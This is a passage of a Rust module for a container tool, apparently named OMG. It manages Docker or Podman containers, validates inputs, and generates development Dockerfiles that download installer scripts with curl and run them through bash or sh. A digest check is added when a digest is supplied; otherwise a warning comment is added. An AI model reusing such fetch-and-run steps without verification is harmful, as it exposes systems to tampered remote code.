//! Container runtime integration (Docker/Podman)
//!
//! Provides:
//! - Auto-detection of Docker or Podman
//! - Run commands in containers with OMG environment
//! - Build development containers with runtime versions
//! - Interactive shell access to containers

use anyhow::{Context, Result};
use serde::{Deserialize, Serialize};
use std::path::Path;
use std::process::{Command, Stdio};

/// Supported container runtimes
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum ContainerRuntime {
    Docker,
    Podman,
}

impl ContainerRuntime {
    /// Get the command name for this runtime
    #[must_use]
    pub fn command(&self) -> &'static str {
        match self {
            Self::Docker => "docker",
            Self::Podman => "podman",
        }
    }

    /// Check if this runtime is available
    #[must_use]
    pub fn is_available(&self) -> bool {
        Command::new(self.command())
            .arg("--version")
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status()
            .is_ok_and(|s| s.success())
    }
}

impl std::fmt::Display for ContainerRuntime {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Docker => write!(f, "Docker"),
            Self::Podman => write!(f, "Podman"),
        }
    }
}

/// Detect available container runtime (prefers Podman for rootless)
#[must_use]
pub fn detect_runtime() -> Option<ContainerRuntime> {
    // Prefer Podman (rootless by default, better security)
    if ContainerRuntime::Podman.is_available() {
        return Some(ContainerRuntime::Podman);
    }
    if ContainerRuntime::Docker.is_available() {
        return Some(ContainerRuntime::Docker);
    }
    None
}

/// Container configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ContainerConfig {
    /// Base image to use
    pub image: String,
    /// Container name (optional)
    pub name: Option<String>,
    /// Environment variables
    pub env: Vec<(String, String)>,
    /// Volume mounts (host:container)
    pub volumes: Vec<(String, String)>,
    /// Working directory inside container
    pub workdir: Option<String>,
    /// Whether to remove container after exit
    pub rm: bool,
    /// Whether to run interactively with TTY
    pub interactive: bool,
}

impl Default for ContainerConfig {
    fn default() -> Self {
        Self {
            image: "ubuntu:24.04".to_string(),
            name: None,
            env: Vec::new(),
            volumes: Vec::new(),
            workdir: None,
            rm: true,
            interactive: true,
        }
    }
}

/// Container manager for running commands in containers
pub struct ContainerManager {
    runtime: ContainerRuntime,
}

impl ContainerManager {
    /// Create a new container manager
    pub fn new() -> Result<Self> {
        let runtime =
            detect_runtime().context("No container runtime found. Install Docker or Podman.")?;
        Ok(Self { runtime })
    }

    /// Create with a specific runtime
    #[must_use]
    pub fn with_runtime(runtime: ContainerRuntime) -> Self {
        Self { runtime }
    }

    /// Run a command in a container and wait for it to exit
    pub fn run(&self, config: &ContainerConfig, command: &[&str]) -> Result<i32> {
        let status = self
            .build_run_command(config, command, false)?
            .status()
            .context("Failed to run container")?;
        Ok(status.code().unwrap_or(1))
    }

    /// Start a command in a background (detached) container.
    ///
    /// Unlike [`ContainerManager::run`], this passes `--detach` so the caller
    /// returns immediately; the runtime prints the container ID on stdout.
    /// See <https://docs.docker.com/reference/cli/docker/container/run/>.
    pub fn run_detached(&self, config: &ContainerConfig, command: &[&str]) -> Result<i32> {
        let status = self
            .build_run_command(config, command, true)?
            .status()
            .context("Failed to run detached container")?;
        Ok(status.code().unwrap_or(1))
    }

    /// Build the `docker/podman run` command for `config`.
    ///
    /// # Security
    /// Image and container names are validated against the shared allowlists
    /// before they ever reach the runtime argv. Image references legitimately
    /// contain ':' (tags/digests), so they need the image-reference grammar,
    /// not the package-name charset.
    fn build_run_command(
        &self,
        config: &ContainerConfig,
        command: &[&str],
        detach: bool,
    ) -> Result<Command> {
        crate::core::security::validate_image_ref(&config.image)?;
        if let Some(ref name) = config.name {
            crate::core::security::validate_package_name(name)?;
        }

        let mut cmd = Command::new(self.runtime.command());
        cmd.arg("run");

        if detach {
            cmd.arg("--detach");
        }

        if config.rm {
            cmd.arg("--rm");
        }

        if config.interactive {
            cmd.arg("-it");
        }

        if let Some(ref name) = config.name {
            cmd.args(["--name", name]);
        }

        if let Some(ref workdir) = config.workdir {
            cmd.args(["-w", workdir]);
        }

        for (key, value) in &config.env {
            cmd.args(["-e", &format!("{key}={value}")]);
        }

        for (host, container) in &config.volumes {
            cmd.args(["-v", &format!("{host}:{container}")]);
        }

        cmd.arg("--");
        cmd.arg(&config.image);
        cmd.args(command);

        Ok(cmd)
    }

    /// Run an interactive shell in a container
    pub fn shell(&self, config: &ContainerConfig) -> Result<i32> {
        self.run(config, &[detect_container_shell(&config.image)])
    }

    /// Execute a command in a running container
    pub fn exec(&self, container: &str, command: &[&str], interactive: bool) -> Result<i32> {
        // SECURITY: Validate container name
        crate::core::security::validate_package_name(container)?;

        let mut cmd = Command::new(self.runtime.command());
        cmd.arg("exec");

        if interactive {
            cmd.arg("-it");
        }

        cmd.arg("--");
        cmd.arg(container);
        cmd.args(command);

        let status = cmd.status().context("Failed to exec in container")?;
        Ok(status.code().unwrap_or(1))
    }

    /// Build a container image with advanced options
    pub fn build_with_options(
        &self,
        dockerfile: &Path,
        tag: &str,
        context: &Path,
        no_cache: bool,
        build_args: &[String],
        target: Option<&str>,
    ) -> Result<()> {
        // SECURITY: Same input hygiene as `run`: the tag follows the
        // image-reference grammar (`registry:port/name:tag` legitimately
        // contains ':'), and a multi-stage target must be a plain stage name.
        // See <https://docs.docker.com/build/building/multi-stage/>.
        crate::core::security::validate_image_ref(tag)?;
        if let Some(t) = target {
            crate::core::security::validate_package_name(t)?;
        }
        for arg in build_args {
            if arg.chars().any(char::is_control) {
                anyhow::bail!("Invalid build argument {arg:?}: control characters are not allowed");
            }
        }
        // The dockerfile must be a relative path inside the build context and
        // the context itself must not escape through `..`.
        let dockerfile_str = dockerfile.to_string_lossy();
        crate::core::security::validate_relative_path(&dockerfile_str)?;
        let context_str = context.to_string_lossy();
        if context_str.contains("..") {
            anyhow::bail!("Invalid build context {context_str:?}: '..' is not allowed");
        }

        let mut cmd = Command::new(self.runtime.command());
        cmd.arg("build");
        cmd.args(["-f", &dockerfile.display().to_string()]);
        cmd.args(["-t", tag]);

        if no_cache {
            cmd.arg("--no-cache");
        }

        for arg in build_args {
            cmd.args(["--build-arg", arg]);
        }

        if let Some(t) = target {
            cmd.args(["--target", t]);
        }

        cmd.arg("--");
        cmd.arg(context.display().to_string());

        let status = cmd.status().context("Failed to build container")?;
        if !status.success() {
            anyhow::bail!("Container build failed with exit code: {:?}", status.code());
        }
        Ok(())
    }

    /// List running containers
    pub fn list_running(&self) -> Result<Vec<ContainerInfo>> {
        let output = Command::new(self.runtime.command())
            .args([
                "ps",
                "--format",
                "{{.ID}}\t{{.Names}}\t{{.Image}}\t{{.Status}}",
            ])
            .output()
            .context("Failed to list containers")?;
        let output = require_successful_output(output, "Container listing")?;

        let stdout = String::from_utf8_lossy(&output.stdout);
        let containers = stdout
            .lines()
            .filter_map(|line| {
                parse_listing_line(line, 4).map(|parts| ContainerInfo {
                    id: parts[0].to_string(),
                    name: parts[1].to_string(),
                    image: parts[2].to_string(),
                    status: parts[3].to_string(),
                })
            })
            .collect();

        Ok(containers)
    }

    /// Stop a running container
    pub fn stop(&self, container: &str) -> Result<()> {
        // SECURITY: Validate container name
        crate::core::security::validate_package_name(container)?;

        let status = Command::new(self.runtime.command())
            .args(["stop", "--", container])
            .status()
            .context("Failed to stop container")?;

        if !status.success() {
            anyhow::bail!("Failed to stop container: {container}");
        }
        Ok(())
    }

    /// Pull an image
    pub fn pull(&self, image: &str) -> Result<()> {
        // SECURITY: Validate image reference
        crate::core::security::validate_image_ref(image)?;
        if !image.contains('@') {
            eprintln!(
                "Warning: pulling '{image}' by mutable tag. Pin a digest (`name@sha256:...`) for reproducible builds."
            );
        }

        let status = Command::new(self.runtime.command())
            .args(["pull", "--", image])
            .status()
            .context("Failed to pull image")?;

        if !status.success() {
            anyhow::bail!("Failed to pull image: {image}");
        }
        Ok(())
    }

    /// List available images
    pub fn list_images(&self) -> Result<Vec<ImageInfo>> {
        let output = Command::new(self.runtime.command())
            .args([
                "images",
                "--format",
                "{{.Repository}}\t{{.Tag}}\t{{.ID}}\t{{.Size}}",
            ])
            .output()
            .context("Failed to list images")?;
        let output = require_successful_output(output, "Image listing")?;

        let stdout = String::from_utf8_lossy(&output.stdout);
        let images = stdout
            .lines()
            .filter_map(|line| {
                parse_listing_line(line, 4).map(|parts| ImageInfo {
                    repository: parts[0].to_string(),
                    tag: parts[1].to_string(),
                    id: parts[2].to_string(),
                    size: parts[3].to_string(),
                })
            })
            .collect();

        Ok(images)
    }

    /// Generate a Dockerfile for OMG development environment
    ///
    /// All interpolated inputs are validated against allowlist charsets
    /// before any formatting: `base_image` must be a plain image reference,
    /// runtime names must pass [`validate_package_name`], and versions must
    /// pass [`validate_version`]. Invalid values never reach executable text.
    /// Unsupported version requests are recorded in the result and emit a
    /// failing build step; the CLI refuses them before writing a Dockerfile.
    pub fn generate_dockerfile(
        &self,
        base_image: &str,
        runtimes: &[(&str, &str)],
        installer_digests: &InstallerDigests,
    ) -> GeneratedDockerfile {
        let base_image = normalized_base_image(base_image);

        use std::fmt::Write as _;

        let mut dockerfile = format!("FROM {base_image}\n\n");
        dockerfile.push_str("# OMG Development Environment\n");
        dockerfile.push_str("LABEL maintainer=\"OMG Team\"\n\n");
        let mut unpinned_urls = Vec::new();
        let mut runtime_errors = Vec::new();

        // Install common dependencies based on base image
        if base_image.contains("ubuntu") || base_image.contains("debian") {
            dockerfile.push_str("RUN apt-get update && apt-get install -y \\\n");
            dockerfile.push_str("    curl wget git build-essential ca-certificates \\\n");
            dockerfile.push_str("    && rm -rf /var/lib/apt/lists/*\n\n");
        } else if base_image.contains("arch") {
            dockerfile.push_str("RUN pacman -Syu --noconfirm && pacman -S --noconfirm \\\n");
            dockerfile.push_str("    curl wget git base-devel\n\n");
        } else if base_image.contains("alpine") {
            dockerfile.push_str("RUN apk add --no-cache \\\n");
            dockerfile.push_str("    curl wget git build-base\n\n");
        }

        // Install runtimes
        for (runtime, version) in runtimes {
            if let Err(error) = crate::core::security::validate_package_name(runtime) {
                tracing::warn!("Skipping runtime {runtime:?} in generated Dockerfile: {error}");
                runtime_errors.push(format!("Invalid runtime name {runtime:?}: {error}"));
                dockerfile
                    .push_str("RUN printf '%s\\n' 'OMG invalid runtime request' >&2; exit 1\n\n");
                continue;
            }
            let version = version
                .strip_prefix('v')
                .or_else(|| version.strip_prefix('V'))
                .filter(|numeric| {
                    numeric.split('.').all(|part| {
                        !part.is_empty() && part.bytes().all(|byte| byte.is_ascii_digit())
                    })
                })
                .unwrap_or(version);
            let version = if version.is_empty() {
                String::new()
            } else if let Err(error) = crate::core::security::validate_version(version) {
                runtime_errors.push(format!(
                    "{runtime}: unsupported version request {version:?}: {error}; use a numeric pin or system"
                ));
                push_runtime_request_failure(&mut dockerfile, runtime);
                String::new()
            } else {
                version.to_string()
            };
            let version = version.as_str();
            let version_check = match runtime_version_check(runtime, version) {
                Ok(check) => check,
                Err(error) => {
                    runtime_errors.push(error.to_string());
                    push_runtime_request_failure(&mut dockerfile, runtime);
                    continue;
                }
            };
            if version == "system"
                && let Some(package) = runtime_system_package(base_image, runtime, version)
            {
                let _ = writeln!(
                    dockerfile,
                    "# {runtime}: distribution default (no version pin)"
                );
                push_package_install(&mut dockerfile, base_image, &package);
                continue;
            }
            if !is_debian_base(base_image)
                && let Some(package) = runtime_system_package(base_image, runtime, version)
            {
                let _ = writeln!(
                    dockerfile,
                    "# {runtime}: distribution default; required version {version}"
                );
                push_package_install(&mut dockerfile, base_image, &package);
                if let Some(check) = &version_check {
                    let _ = writeln!(dockerfile, "{check}\n");
                }
                continue;
            }
            match *runtime {
                "node" => {
                    dockerfile.push_str("# Install Node.js\n");
                    dockerfile.push_str("ENV NODE_VERSION=");
                    // NodeSource accepts numeric majors. Only an unspecified
                    // legacy request uses the fixed fallback; unresolved aliases
                    // have already been refused above.
                    let node_major = version
                        .split('.')
                        .next()
                        .filter(|major| {
                            !major.is_empty() && major.chars().all(|c| c.is_ascii_digit())
                        })
                        .unwrap_or("20");
                    dockerfile.push_str(node_major);
                    dockerfile.push('\n');
                    let setup_url = format!("https://deb.nodesource.com/setup_{node_major}.x");
                    let digest_check = digest_check_line(
                        &setup_url,
                        installer_digests,
                        &mut unpinned_urls,
                        "/tmp/nodesource-setup.sh",
                    );
                    if digest_check.is_none() {
                        push_unpinned_warning(&mut dockerfile, &setup_url);
                    }
                    let _ = writeln!(
                        dockerfile,
                        "RUN curl -fsSL -o /tmp/nodesource-setup.sh {setup_url} \\"
                    );
                    if let Some(line) = digest_check {
                        let _ = writeln!(dockerfile, "{line}");
                    }
                    dockerfile.push_str("    && bash /tmp/nodesource-setup.sh \\\n");
                    dockerfile.push_str("    && rm -f /tmp/nodesource-setup.sh \\\n");
                    dockerfile.push_str("    && apt-get install -y nodejs \\\n");
                    dockerfile.push_str("    && rm -rf /var/lib/apt/lists/*\n\n");
                }
                "python" => {
                    dockerfile.push_str("# Install Python (distribution default)\n");
                    let _ = writeln!(dockerfile, "# Required Python version: {version}");
                    dockerfile.push_str("RUN apt-get update && apt-get install -y \\\n");
                    dockerfile.push_str("    python3 python3-pip python3-venv \\\n");
                    dockerfile.push_str("    && rm -rf /var/lib/apt/lists/* \\\n");
                    dockerfile.push_str("    && ln -sf /usr/bin/python3 /usr/bin/python\n\n");
                }
                "rust" => {
                    dockerfile.push_str("# Install Rust\n");
                    dockerfile.push_str("ENV RUSTUP_HOME=/usr/local/rustup \\\n");
                    dockerfile.push_str("    CARGO_HOME=/usr/local/cargo \\\n");
                    dockerfile.push_str("    PATH=/usr/local/cargo/bin:$PATH\n");
                    // rustup requires a non-empty toolchain name; fall back to
                    // the stable channel for unspecified/symbolic versions.
                    // https://rust-lang.github.io/rustup/concepts/toolchains.html
                    let toolchain = match version {
                        "" | "latest" => "stable",
                        other => other,
                    };
                    const RUSTUP_INIT_URL: &str = "https://sh.rustup.rs";
                    let digest_check = digest_check_line(
                        RUSTUP_INIT_URL,
                        installer_digests,
                        &mut unpinned_urls,
                        "/tmp/omg-rustup-init.sh",
                    );
                    if digest_check.is_none() {
                        push_unpinned_warning(&mut dockerfile, RUSTUP_INIT_URL);
                    }
                    let _ = writeln!(
                        dockerfile,
                        "RUN curl --proto '=https' --tlsv1.2 -sSf -o /tmp/omg-rustup-init.sh \\"
                    );
                    let _ = writeln!(dockerfile, "    {RUSTUP_INIT_URL} \\");
                    if let Some(line) = digest_check {
                        let _ = writeln!(dockerfile, "{line}");
                    }
                    let _ = writeln!(
                        dockerfile,
                        "    && sh /tmp/omg-rustup-init.sh -s -- -y --default-toolchain {toolchain} \\"
                    );
                    dockerfile.push_str("    && rm -f /tmp/omg-rustup-init.sh\n\n");
                }
                "go" => {
                    dockerfile.push_str("# Install Go\n");
                    dockerfile.push_str("RUN arch=\"$(dpkg --print-architecture)\" && test \"$arch\" = amd64 || { printf '%s\\n' 'OMG Go archive requires Debian amd64; use a system provider or custom Dockerfile' >&2; exit 1; }\n");
                    // The tarball URL embeds the version, so it must be a real
                    // release number, never empty or "latest".
                    // https://go.dev/doc/install
                    let go_ver = if version.is_empty() || version == "latest" {
                        "1.22.0"
                    } else {
                        version
                    };
                    dockerfile.push_str("ENV GO_VERSION=");
                    dockerfile.push_str(go_ver);
                    dockerfile.push('\n');
                    let go_url = format!("https://go.dev/dl/go{go_ver}.linux-amd64.tar.gz");
                    let digest_check = digest_check_line(
                        &go_url,
                        installer_digests,
                        &mut unpinned_urls,
                        "/tmp/omg-go.tar.gz",
                    );
                    if digest_check.is_none() {
                        push_unpinned_warning(&mut dockerfile, &go_url);
                    }
                    let _ = writeln!(
                        dockerfile,
                        "RUN curl -fsSL -o /tmp/omg-go.tar.gz {go_url} \\"
                    );
                    if let Some(line) = digest_check {
                        let _ = writeln!(dockerfile, "{line}");
                    }
                    dockerfile.push_str("    && tar -C /usr/local -xzf /tmp/omg-go.tar.gz \\\n");
                    dockerfile.push_str("    && rm -f /tmp/omg-go.tar.gz \\\n");
                    dockerfile.push_str("    && ln -sf /usr/local/go/bin/go /usr/local/bin/go\n");
                    dockerfile.push_str("ENV PATH=$PATH:/usr/local/go/bin\n\n");
                }
                "bun" => {
                    dockerfile.push_str("# Install Bun\n");
                    const BUN_INSTALL_URL: &str = "https://bun.sh/install";
                    let digest_check = digest_check_line(
                        BUN_INSTALL_URL,
                        installer_digests,
                        &mut unpinned_urls,
                        "/tmp/omg-bun-install.sh",
                    );
                    if digest_check.is_none() {
                        push_unpinned_warning(&mut dockerfile, BUN_INSTALL_URL);
                    }
                    let _ = writeln!(
                        dockerfile,
                        "RUN curl -fsSL -o /tmp/omg-bun-install.sh {BUN_INSTALL_URL} \\"
                    );
                    if let Some(line) = digest_check {
                        let _ = writeln!(dockerfile, "{line}");
                    }
                    dockerfile.push_str("    && bash /tmp/omg-bun-install.sh \\\n");
                    dockerfile.push_str("    && rm -f /tmp/omg-bun-install.sh\n");
                    dockerfile.push_str("ENV PATH=$PATH:/root/.bun/bin\n\n");
                }
                "java" => {
                    dockerfile.push_str("# Install Java\n");
                    let java_pkg = version
                        .split('.')
                        .next()
                        .filter(|major| {
                            !major.is_empty() && major.chars().all(|c| c.is_ascii_digit())
                        })
                        .map_or_else(
                            || "default-jdk".to_string(),
                            |major| format!("openjdk-{major}-jdk"),
                        );
                    dockerfile.push_str("RUN apt-get update && apt-get install -y ");
                    dockerfile.push_str(&java_pkg);
                    dockerfile.push_str(" \\\n");
                    dockerfile.push_str("    && rm -rf /var/lib/apt/lists/*\n\n");
                }
                "ruby" => {
                    dockerfile.push_str("# Install Ruby\n");
                    let ruby_components: Vec<&str> = version
                        .split('.')
                        .take(2)
                        .filter(|component| component.chars().all(|c| c.is_ascii_digit()))
                        .collect();
                    let ruby_pkg = if ruby_components.is_empty() {
                        "ruby-full".to_string()
                    } else {
                        format!("ruby{}", ruby_components.join("."))
                    };
                    dockerfile.push_str("RUN apt-get update && apt-get install -y ");
                    dockerfile.push_str(&ruby_pkg);
                    dockerfile.push_str(" \\\n");
                    dockerfile.push_str("    && rm -rf /var/lib/apt/lists/*\n\n");
                }
                _ => {
                    // Attempt to install as system package based on distribution
                    push_package_install(&mut dockerfile, base_image, runtime);
                    if !push_package_install_supported(base_image) {
                        use std::fmt::Write as _;
                        let _ = writeln!(
                            dockerfile,
                            "# Please manually install {runtime} {version} using your distribution's package manager"
                        );
                    }
                }
            }
            if let Some(check) = version_check {
                let _ = writeln!(dockerfile, "{check}\n");
            }
        }

        dockerfile.push_str("WORKDIR /app\n\n");
        dockerfile.push_str("# Copy project files\n");
        dockerfile.push_str("COPY . .\n\n");
        dockerfile.push_str("CMD [\"/bin/bash\"]\n");

        GeneratedDockerfile {
            content: dockerfile,
            unpinned_urls,
            runtime_errors,
        }
    }
}

/// A generated Dockerfile plus the remote content it would execute without
/// a pinned digest.
#[derive(Debug, Clone)]
pub struct GeneratedDockerfile {
    /// The Dockerfile text.
    pub content: String,
    /// Installer URLs executed WITHOUT digest verification because no
    /// digest was supplied. `omg container init` resolves these and
    /// regenerates; a non-empty list after regeneration is refused.
    pub unpinned_urls: Vec<String>,
    /// Version requests that the generated installation cannot enforce.
    /// The CLI refuses output containing these; direct callers also receive
    /// an explicit failing build step.
    pub runtime_errors: Vec<String>,
}

fn push_runtime_request_failure(dockerfile: &mut String, runtime: &str) {
    use std::fmt::Write as _;
    let _ = writeln!(
        dockerfile,
        "RUN printf '%s\\n' 'OMG cannot satisfy runtime version request for {runtime}; use a numeric pin or system' >&2; exit 1\n"
    );
}

fn runtime_version_check(runtime: &str, version: &str) -> Result<Option<String>> {
    anyhow::ensure!(
        version != "default",
        "{runtime}: unresolved container default; choose an explicit version or system"
    );
    anyhow::ensure!(
        runtime != "rust" || version != "system",
        "Rust container system requests are unsupported; choose an explicit toolchain or a custom Dockerfile"
    );
    if version.is_empty() || version == "system" || runtime == "rust" {
        return Ok(None);
    }
    let command = match runtime {
        "node" => "node -p 'process.versions.node'",
        "python" => "python3 -c 'import platform; print(platform.python_version())'",
        "go" => {
            "raw=\"$(go version)\" && printf '%s\\n' \"$raw\" | awk '{sub(/^go/, \"\", $3); print $3}'"
        }
        "ruby" => "ruby -e 'puts RUBY_VERSION'",
        "bun" => "bun --version",
        "java" => {
            "raw=\"$(java -version 2>&1)\" && printf '%s\\n' \"$raw\" | awk 'NR == 1 {gsub(/\"/, \"\", $3); sub(/^1\\./, \"\", $3); print $3}'"
        }
        _ if version == "latest" => return Ok(None),
        _ => anyhow::bail!(
            "Cannot verify container runtime {runtime} version {version}; use a custom Dockerfile or system"
        ),
    };
    let version = version
        .strip_prefix('v')
        .or_else(|| version.strip_prefix('V'))
        .unwrap_or(version);
    let components: Vec<_> = version.split('.').collect();
    anyhow::ensure!(
        (1..=3).contains(&components.len())
            && components
                .iter()
                .all(|part| !part.is_empty() && part.bytes().all(|byte| byte.is_ascii_digit())),
        "{runtime}: unsupported version request {version:?}; use a numeric pin or system"
    );
    if runtime == "go" {
        anyhow::ensure!(
            components.len() == 3,
            "Go container pins require an exact X.Y.Z release, found {version}; use an exact pin or system"
        );
    }
    let pattern = if components.len() == 3 {
        version.to_string()
    } else {
        format!("{version}|{version}.*")
    };
    Ok(Some(format!(
        "RUN actual=\"$({command})\" && case \"$actual\" in {pattern}) ;; *) printf '%s\\n' 'OMG runtime version mismatch: {runtime} must satisfy {version}' >&2; exit 1 ;; esac"
    )))
}

/// SHA-256 digests for remote installer content a generated Dockerfile
/// executes, keyed by URL. Captured over TLS at generation time so the
/// root build step can prove it re-downloads the exact same bytes.
pub type InstallerDigests = std::collections::BTreeMap<String, String>;

/// Entries that keep untracked credentials and repository internals out of
/// the build context of a generated dev-container image.
pub(crate) const DOCKERIGNORE_ENTRIES: &[&str] = &[
    ".git",
    ".env",
    ".env.*",
    "!.env.example",
    "*.pem",
    "*.key",
    "id_rsa*",
    ".omg/",
];

const DOCKERIGNORE_MARKER: &str = "# added by omg container init";

/// Ensure `.dockerignore` excludes credentials and repository internals.
///
/// `COPY . .` in a generated Dockerfile ships the whole directory into the
/// image; without ignore rules, untracked secrets (`.env`, key files) and
/// the repository history (`.git/`) are embedded in every build. An
/// existing file is preserved and a final protection block is appended after
/// user negations, including a Dockerfile-specific override when present.
///
/// # Errors
///
/// Returns errors from reading or writing `.dockerignore`.
pub(crate) fn ensure_dockerignore(root: &Path) -> Result<()> {
    ensure_dockerignore_file(&root.join(".dockerignore"), true)?;
    // BuildKit gives this file precedence over the root ignore file.
    ensure_dockerignore_file(&root.join("Dockerfile.omg.dockerignore"), false)?;
    // Podman prefers .containerignore over .dockerignore.
    ensure_dockerignore_file(&root.join(".containerignore"), false)
}

fn ensure_dockerignore_file(ignore_path: &Path, create: bool) -> Result<()> {
    use std::fmt::Write as _;
    let existing = crate::config::mise_env::read_bounded_regular_file(ignore_path)?;
    if existing.is_none() && !create {
        return Ok(());
    }
    let existing = existing.unwrap_or_default();
    // Docker applies the last matching rule. Only a complete trailing block
    // can establish protection in the presence of arbitrary user negations.
    let mut protection = format!("{DOCKERIGNORE_MARKER}\n");
    for entry in DOCKERIGNORE_ENTRIES {
        writeln!(&mut protection, "{entry}").context("Failed to format .dockerignore entry")?;
    }
    if existing.ends_with(&protection) {
        return Ok(());
    }

    let mut output = existing;
    if !output.is_empty() && !output.ends_with('\n') {
        output.push('\n');
    }
    output.push_str(&protection);
    crate::core::safe_ops::atomic_write_file_sync(ignore_path, output)
        .with_context(|| format!("Failed to write {}", ignore_path.display()))
}

/// Whether a digest string is a well-formed lowercase/uppercase hex SHA-256.
fn is_sha256_hex(digest: &str) -> bool {
    digest.len() == 64 && digest.chars().all(|c| c.is_ascii_hexdigit())
}

/// Build the shell command that verifies a downloaded file against the
/// pinned digest for `url`, or record the URL as unpinned and return `None`.
fn digest_check_line(
    url: &str,
    digests: &InstallerDigests,
    unpinned: &mut Vec<String>,
    downloaded_path: &str,
) -> Option<String> {
    if let Some(digest) = digests.get(url).filter(|digest| is_sha256_hex(digest)) {
        Some(format!(
            "    && echo \"{digest}  {downloaded_path}\" | sha256sum -c - \\"
        ))
    } else {
        unpinned.push(url.to_string());
        None
    }
}

/// Warn about an unpinned installer.
///
/// The warning must never sit inside a backslash continuation chain: a `#`
/// line joined into a RUN command comments out everything after it.
fn push_unpinned_warning(dockerfile: &mut String, url: &str) {
    use std::fmt::Write as _;

    let _ = writeln!(
        dockerfile,
        "# WARNING: no pinned digest for {url}; this download executes unverified"
    );
}

/// Whether an image reference consists only of safe Docker-reference
/// characters. Anything else (shell metacharacters, whitespace, option-like
/// prefixes, traversal) must never reach a generated Dockerfile.
pub(crate) fn normalized_base_image(image: &str) -> &str {
    if is_safe_image_reference(image) {
        image
    } else {
        tracing::warn!("Refusing unsafe base image {image:?}; falling back to ubuntu:24.04");
        "ubuntu:24.04"
    }
}

fn is_safe_image_reference(image: &str) -> bool {
    crate::core::security::validate_image_ref(image).is_ok()
}

/// Whether [`push_package_install`] knows how to emit an install line for
/// this base-image family.
fn is_debian_base(base_image: &str) -> bool {
    base_image.contains("ubuntu") || base_image.contains("debian")
}

fn push_package_install_supported(base_image: &str) -> bool {
    is_debian_base(base_image)
        || base_image.contains("arch")
        || base_image.contains("alpine")
        || base_image.contains("fedora")
        || base_image.contains("rhel")
        || base_image.contains("centos")
        || base_image.contains("opensuse")
}

fn runtime_system_package(base_image: &str, runtime: &str, version: &str) -> Option<String> {
    match runtime {
        "node" => Some("nodejs".to_string()),
        "python" if base_image.contains("arch") => Some("python".to_string()),
        "python" => Some("python3".to_string()),
        "go" if version == "system" && is_debian_base(base_image) => Some("golang-go".to_string()),
        "go" if version == "system"
            && (base_image.contains("arch") || base_image.contains("alpine")) =>
        {
            Some("go".to_string())
        }
        "go" if version == "system" => Some("golang".to_string()),
        "java" if base_image.contains("arch") => Some("jdk-openjdk".to_string()),
        "java" if base_image.contains("alpine") => {
            let major = version.split('.').next().filter(|part| {
                !part.is_empty() && part.chars().all(|character| character.is_ascii_digit())
            });
            Some(format!("openjdk{}", major.unwrap_or("21")))
        }
        "java"
            if base_image.contains("fedora")
                || base_image.contains("rhel")
                || base_image.contains("centos")
                || base_image.contains("opensuse") =>
        {
            let major = version.split('.').next().filter(|part| {
                !part.is_empty() && part.chars().all(|character| character.is_ascii_digit())
            });
            Some(format!("java-{}-openjdk-devel", major.unwrap_or("21")))
        }
        "java" if is_debian_base(base_image) => Some("default-jdk".to_string()),
        "java" => Some("java".to_string()),
        "ruby" => Some("ruby".to_string()),
        _ => None,
    }
}

/// Append the distribution-appropriate package-install command for `package`
/// to a generated Dockerfile. Emits a warning comment for unknown base-image
/// families instead of guessing a package manager.
fn push_package_install(dockerfile: &mut String, base_image: &str, package: &str) {
    use std::fmt::Write as _;

    let _ = writeln!(dockerfile, "# Install {package}");
    if base_image.contains("ubuntu") || base_image.contains("debian") {
        let _ = writeln!(
            dockerfile,
            "RUN apt-get update && apt-get install -y {package} && rm -rf /var/lib/apt/lists/*\n"
        );
    } else if base_image.contains("arch") {
        let _ = writeln!(dockerfile, "RUN pacman -S --noconfirm {package}\n");
    } else if base_image.contains("alpine") {
        let _ = writeln!(dockerfile, "RUN apk add --no-cache {package}\n");
    } else if base_image.contains("fedora")
        || base_image.contains("rhel")
        || base_image.contains("centos")
    {
        let _ = writeln!(
            dockerfile,
            "RUN dnf install -y {package} && dnf clean all\n"
        );
    } else if base_image.contains("opensuse") {
        let _ = writeln!(
            dockerfile,
            "RUN zypper install -y {package} && zypper clean\n"
        );
    } else {
        let _ = writeln!(
            dockerfile,
            "# WARNING: Unknown base image '{base_image}' - package installation not automated"
        );
        let _ = writeln!(
            dockerfile,
            "# Supported base images: ubuntu, debian, arch, alpine, fedora, rhel, centos, opensuse\n"
        );
    }
}

/// Split one tab-separated `--format` output line from the runtime.
///
/// Lines without the expected column count are reported via `tracing::warn!`
/// and skipped instead of being dropped silently.
fn parse_listing_line(line: &str, expected_columns: usize) -> Option<Vec<&str>> {
    let parts: Vec<&str> = line.split('\t').collect();
    if parts.len() < expected_columns {
        if !line.is_empty() {
            tracing::warn!(
                "Skipping malformed runtime listing line (expected {expected_columns} columns): {line:?}"
            );
        }
        return None;
    }
    Some(parts)
}

fn require_successful_output(
    output: std::process::Output,
    operation: &str,
) -> Result<std::process::Output> {
    if output.status.success() {
        return Ok(output);
    }

    let stderr = String::from_utf8_lossy(&output.stderr);
    anyhow::bail!(
        "{operation} failed with status {:?}: {}",
        output.status.code(),
        stderr.trim()
    );
}

/// Information about a running container
#[derive(Debug, Clone)]
pub struct ContainerInfo {
    pub id: String,
    pub name: String,
    pub image: String,
    pub status: String,
}

/// Information about a container image
#[derive(Debug, Clone)]
pub struct ImageInfo {
    pub repository: String,
    pub tag: String,
    pub id: String,
    pub size: String,
}

/// Detect the best shell for a container image
fn detect_container_shell(image: &str) -> &'static str {
    if image.contains("alpine") {
        "/bin/sh"
    } else {
        "/bin/bash"
    }
}

fn development_container_name(project_dir: &Path) -> String {
    let project_name = project_dir
        .file_name()
        .and_then(|name| name.to_str())
        .unwrap_or("omg");
    let mut sanitized = String::with_capacity(project_name.len().min(251));
    for character in project_name.chars() {
        if sanitized.len() >= 251 {
            break;
        }
        if character.is_ascii_alphanumeric() || matches!(character, '.' | '_' | '-') {
            sanitized.push(character);
        } else if !sanitized.ends_with('-') {
            sanitized.push('-');
        }
    }
    let sanitized = sanitized.trim_matches(['.', '_', '-']);
    let project_name = if sanitized.is_empty() {
        "omg"
    } else {
        sanitized
    };
    format!("{project_name}-dev")
}

/// Create a development container config for the current project
pub fn dev_container_config(project_dir: &Path) -> ContainerConfig {
    ContainerConfig {
        image: "ubuntu:24.04".to_string(),
        name: Some(development_container_name(project_dir)),
        env: vec![("TERM".to_string(), "xterm-256color".to_string())],
